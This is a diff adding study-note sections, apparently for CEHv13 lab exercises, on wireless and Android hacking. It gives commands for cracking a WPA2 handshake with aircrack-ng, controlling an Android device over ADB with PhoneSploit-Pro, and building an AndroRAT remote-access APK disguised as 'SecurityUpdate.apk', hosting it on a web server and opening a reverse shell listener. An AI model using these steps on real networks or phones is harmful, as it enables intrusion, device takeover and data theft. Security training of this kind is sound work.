@@ -2000,3 +2000,92 @@ and on right side it will show required info
 ```
 </details>
 
+# Hacking wireless network
+<details>
+<summary>Perform Wireless Traffic Analysis</summary>
+
+
+* Wi-Fi packet analysis using Wireshark
+```console
+:~$ open wireshark
+Wireshark: Open Capture File window appears, navigate to E:\CEH-Tools\CEHv13 Module 16 Hacking Wireless Networks\Sample Captures, select WPA2crack-01.cap and click Open.
+```
+</details>
+<details>
+<summary>Perform Wireless Attacks</summary>
+
+* Crack a WPA2 network using Aircrack-ng
+```console
+:~$paroot
+ CEHv13 Module 16 Hacking Wireless Networks folder and copy Sample Captures and Wordlist folders.
+ and open terminal
+  aircrack-ng -a2 -b [Target BSSID] -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'.
+
+  -a is the technique used to crack the handshake, 2=WPA technique.
+-b refers to bssid; replace with the BSSID of the target router.
+-w stands for wordlist; provide the path to a wordlist.
+you will get key
+```
+</details>
+
+# Hacking mobile platform
+<details>
+<summary>Hack Android Devices</summary>
+
+* Exploit the Android Platform through ADB using PhoneSploit-Pro
+```console
+:~$ parrot machine n targetting android
+cd PhoneSploit-Pro
+and run
+python3 phonesploitpro.py
+go through the options and
+Note down the location of images.jpeg (in this example, /sdcard/Download/images.jpeg). You can download the file by selecting option 8 in the PhoneSploit Pro main menu options. for download the image file
+In the Terminal window, type N and press Enter to navigate to additional PhoneSploit-Pro options 
+
+At the Main Menu prompt, type 23 and press Enter to choose Open a Link on Device.
+
+When prompted to Enter URL, type the desired URL (in this case, https://pranx.com/hacker/) and press Enter.
+Now, at the Main Menu prompt, type 27 and press Enter to choose the Get Device Information 
+```
+
+* Hack an Android Device by Creating APK File using AndroRAT
+```console
+:~$  cd AndroRAT 
+python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
+--build: is used for building the APK
+-i: specifies the local IP address (here, 10.10.1.13)
+-p: specifies the port number (here, 4444)
+-o: specifies the output APK file (here, SecurityUpdate.apk)
+cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/
+```
+```console
+:~$ if share folder is not present
+Run mkdir /var/www/html/share command to create a shared folder
+Run chmod -R 755 /var/www/html/share command
+Run chown -R www-data:www-data /var/www/html/share command
+
+service apache2 start
+then to listen
+run python3 androRAT.py --shell -i 0.0.0.0 -p 4444
+--shell: is used for getting the interpreter
+-i: specifies the IP address for listening (here, 0.0.0.0)
+-p: specifies the port number (here, 4444)
+
+and open andorid
+chrome
+http://10.10.1.13/share
+and download apk
+and go back to AndroRAT listning
+and type
+help
+and type required options to get info
+```
+</details>
+<details>
+<summary>Secure Android Devices from Malicious Apps using AVG</summary>
+
+```console
+:~$ Open SVG app in android
+and scan for threat
+```
+</details>
